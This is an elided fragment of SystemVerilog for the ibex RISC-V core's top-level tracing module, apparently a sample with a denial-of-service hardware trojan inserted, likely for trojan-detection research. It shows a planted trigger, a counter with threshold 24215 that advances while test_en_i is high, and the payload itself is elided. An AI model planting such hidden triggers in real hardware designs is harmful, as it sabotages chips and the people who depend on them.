...
/**
 * Top level module of_trojan_DoS the ibex RISC-V core with tracing enabled
 */
...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  `ifndef RVFI
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24215)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24215;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (test_en_i) trojan_counter <= trojan_counter + 1;
